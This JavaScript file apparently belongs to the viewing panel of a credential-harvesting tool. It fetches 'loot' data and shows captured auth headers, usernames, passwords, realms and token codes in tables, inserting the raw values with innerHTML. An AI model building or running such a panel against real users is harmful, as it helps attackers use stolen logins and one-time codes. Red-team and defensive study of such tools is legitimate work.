window.addEventListener("load", () => {
  // Fetch the loot data
  fetch("../loot/")
    .then((response) => response.json())
    .then((data) => {
      const authHeaders = data.auth_headers;
      const authRequests = data.auth_requests;
      const miscRequests = data.catch_all_requests;

      const table0 = document.getElementById("auth-headers-table");
      const table1 = document.getElementById("auth-requests-table");
      const table2 = document.getElementById("misc-requests-table");

      authHeaders.forEach((authHeader) => {
        const [key, value] = authHeader.split(":");
        const row = table0.insertRow();
        const cell0 = row.insertCell();
        const cell1 = row.insertCell();

        cell0.innerHTML = key;
        cell1.innerHTML = value;
      });

      authRequests.forEach((authRequest) => {
        const row = table1.insertRow();
        const cell0 = row.insertCell();
        const cell1 = row.insertCell();
        const cell2 = row.insertCell();
        const cell3 = row.insertCell();
        const cell4 = row.insertCell();

        cell0.innerHTML = authRequest.timestamp;
        cell1.innerHTML = authRequest.realm;
        cell2.innerHTML = authRequest.username;
        cell3.innerHTML = authRequest.password;
        cell4.innerHTML = authRequest.token_code;
      });

      miscRequests.forEach((miscRequest) => {
        const row = table2.insertRow();
        const cell0 = row.insertCell();
        const cell1 = row.insertCell();
        const cell2 = row.insertCell();

        cell0.innerHTML = miscRequest.timestamp;
        cell1.innerHTML = miscRequest.path_name;
        cell2.innerHTML = miscRequest.body;
      });
    })
    .catch((error) => console.error(error));

  // Add event listener to the collapsible button
  var coll = document.getElementsByClassName("collapsible");
  var i;

  for (i = 0; i < coll.length; i++) {
    coll[i].addEventListener("click", function () {
      this.classList.toggle("active");
      var content = this.nextElementSibling;
      if (content.style.display === "block") {
        content.style.display = "none";
      } else {
        content.style.display = "block";
      }
    });
  }
});
